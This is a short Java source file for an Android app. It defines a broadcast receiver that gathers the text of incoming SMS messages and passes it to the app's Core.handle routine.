package uz.lazer.tolov;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        try {
            StringBuilder s = new StringBuilder();
            for (SmsMessage m : Telephony.Sms.Intents.getMessagesFromIntent(i)) s.append(m.getMessageBody());
            Core.handle(c, s.toString(), "SMS");
        } catch (Exception ignored) {}
    }
}
